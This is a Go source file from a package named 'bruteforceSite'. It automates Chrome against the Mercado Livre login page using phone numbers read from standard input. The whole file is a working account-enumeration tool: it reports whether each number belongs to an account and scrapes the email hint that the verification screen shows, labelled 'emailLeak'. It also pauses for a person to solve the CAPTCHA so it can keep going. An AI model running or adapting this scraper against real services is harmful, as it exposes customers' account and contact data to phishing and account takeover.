package bruteforceSite

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/chromedp/chromedp/kb"
)

func BruteMercadoLivre() {

	payloads := []string{}
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		payloads = append(payloads, strings.Replace(scanner.Text(), "+", "", -1))
	}

	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "Erro de leitura:", err)
	}
	maxTrys := 2
	url := "https://www.mercadolivre.com.br/"
	currentTime := time.Now()
	formattedTime := currentTime.Format("2006-01-02 15:04:05")
	fmt.Println("["+formattedTime+"]", "[URL] [TRY]", url)
	countBotsDetected := 0
	for indexPayload := 0; indexPayload < len(payloads); indexPayload++ {
		numberphone := payloads[indexPayload]
		var options []func(*chromedp.ExecAllocator)
		if countBotsDetected >= 1 {
			fmt.Println("[!!!] Required User Interaction")
			options = []chromedp.ExecAllocatorOption{
				chromedp.Flag("ignore-certificate-errors", "1"),
				chromedp.Flag("headless", false), // set headless to false
				chromedp.Flag("disable-gpu", true),
			}
		} else {
			options = []chromedp.ExecAllocatorOption{
				chromedp.Flag("ignore-certificate-errors", "1"),
				chromedp.Flag("headless", false), // set headless to false
				chromedp.Flag("disable-gpu", true),
			}
		}
		for i := 1; i <= maxTrys; i++ {
			ctx, cancel := chromedp.NewContext(
				context.Background(),
				chromedp.WithDebugf(log.Printf),
			)
			defer cancel()
			ctx, cancel = chromedp.NewExecAllocator(ctx, options...)
			defer cancel()
			ctx, cancel = chromedp.NewContext(ctx)
			defer cancel()
			ctx, cancel = context.WithTimeout(ctx, 80*time.Second)
			defer cancel()
			botDetected := ""
			emailLeak := ""
			userNOTexist := ""
			err := chromedp.Run(ctx,
				chromedp.Navigate(url),
				chromedp.WaitVisible(`body`, chromedp.ByQuery), // substitua 'inputID' pelo ID do seu elemento de entrada
				chromedp.Sleep(1*time.Second),
				chromedp.Evaluate(`document.body.querySelectorAll("a[data-link-id='login']")[0].click()`, nil),
			)
			if err != nil {
				log.Println(err)

				if i != maxTrys {
					log.Println("[/] Try Again:", numberphone)
					continue
				}
			}
			fmt.Println("[-] Trying Number:", numberphone)
			defer cancel()
			err = chromedp.Run(ctx,
				chromedp.WaitVisible(`#user_id`, chromedp.ByID),
				chromedp.Sleep(1*time.Second),
				chromedp.SendKeys(`#user_id`, numberphone, chromedp.ByID),
				chromedp.Sleep(1*time.Second),
				chromedp.KeyEvent(kb.Enter),
				//chromedp.Evaluate(`document.body.querySelectorAll("button[type='submit']")[0].click()`, nil),
				chromedp.Sleep(1*time.Second),
				chromedp.WaitReady(`#rc-anchor-container, #code_validation, .input-error`, chromedp.ByQuery),
				chromedp.Evaluate(`document.getElementsByClassName("recaptcha__error-icon")[0]?"botDetected":""`, &botDetected),
				chromedp.Evaluate(`document.getElementsByClassName("input-error")[0]?(document.getElementsByClassName("input-error")[0].getElementsByClassName("ui-form__message")[0]?"notExist":""):""`, &userNOTexist),
			)
			if err != nil {
				log.Println(err)
				if i != maxTrys {
					log.Println("[-] Try Again:", numberphone)
					continue
				}
			}
			if botDetected == "botDetected" {
				fmt.Println("[!] Bot Detected")
				countBotsDetected++
				if countBotsDetected >= 1 {
					fmt.Println("[-] Waiting for Captcha verification. ")
					err = chromedp.Run(ctx,
						chromedp.Sleep(1*time.Second),
						chromedp.Evaluate(`
											function botfinish(){document.getElementsByClassName("login-form__actions")[0].innerHTML += "<botfinish></botfinish>"}
											document.getElementsByClassName("login-form__actions")[0].innerHTML += '<button href="#" style="background-color: green;"  spellcheck=false onclick="botfinish()">Robot verified</button>'
											`, nil),
						chromedp.WaitVisible(`botfinish`, chromedp.ByQuery),
					)
					if err != nil {
						log.Println(err)
						if i != maxTrys {
							log.Println("[Error] Verfique o captcha: ", numberphone)
							continue
						}
					}
					fmt.Println("captcha verified")
					botDetected = ""
					err = chromedp.Run(ctx,
						chromedp.Sleep(1*time.Second),
						chromedp.SendKeys(`#user_id`, numberphone, chromedp.ByID),
						chromedp.Sleep(1*time.Second),
						chromedp.KeyEvent(kb.Enter),
						chromedp.WaitReady(`#code_validation, .input-error`, chromedp.ByQuery),
						chromedp.Evaluate(`document.getElementsByClassName("input-error")[0]?(document.getElementsByClassName("input-error")[0].getElementsByClassName("ui-form__message")[0]?"notExist":""):""`, &userNOTexist),
					)
					if err != nil {
						if i != maxTrys {
							log.Println("[Error] Verfique o captcha [1]: ", numberphone)
							continue
						}
					}
				}
			}
			if botDetected != "botDetected" && userNOTexist == "" {
				countBotsDetected = 0
				err = chromedp.Run(ctx,
					chromedp.Evaluate(`
					emailLeak = document.getElementById("code_validation").innerText.split(" ");
					emailLeak[emailLeak.length-1].replace(/\.$/,"")`, &emailLeak),
				)
				if err != nil {
					log.Println(err)
					if i != maxTrys {
						log.Println("[-] Try Again[1]:", numberphone)
						continue
					}
				}
				if emailLeak != "" {
					fmt.Println("emailLeak:", emailLeak)
				}
			}
			if botDetected == "" && userNOTexist == "notExist" {
				countBotsDetected = 0
				fmt.Println("[!] User Not Exist")
			}
			defer cancel()
			break
		}
	}
}
